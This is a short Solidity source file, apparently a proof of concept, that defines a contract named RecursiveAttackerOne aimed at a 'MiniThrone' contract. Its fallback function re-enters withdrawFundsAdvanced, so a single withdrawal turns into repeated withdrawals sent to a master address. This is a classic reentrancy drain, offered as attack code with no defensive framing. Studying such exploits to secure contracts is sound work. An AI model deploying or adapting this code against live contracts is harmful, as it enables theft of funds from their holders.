
contract MiniThroneInterface {

    function withdrawFundsAdvanced(
        address _toAddress,
        uint _valueWei,
        uint _extraGas
    );

    function claimThrone(string _monarchName);

}

contract RecursiveAttackerOne {

    MiniThroneInterface public throne;
    uint public withdrawAmount;
    address public master;
    bool public activated;

    function RecursiveAttackerOne(
        address _throne,
        address _master,
        uint _withdrawAmount
    ) {
        throne = MiniThroneInterface(_throne);
        master = _master;
        withdrawAmount = _withdrawAmount;
        activated = false;
    }
    
    function claim(uint claimPrice, uint gasAmount) {
        activated = true;
        throne.claimThrone.value(claimPrice).gas(gasAmount)('evil');
    }

    function withdrawToSelf(uint innerGasAmount, bool fallbackArmed) {
        activated = fallbackArmed;
        throne.withdrawFundsAdvanced.gas(innerGasAmount + 50000)(this, withdrawAmount, innerGasAmount);
    }
    
    function disarm() {
        activated = false;
    }

    function() {
        if (activated) {
            throne.withdrawFundsAdvanced(master, withdrawAmount, 0);
        }
    }

}
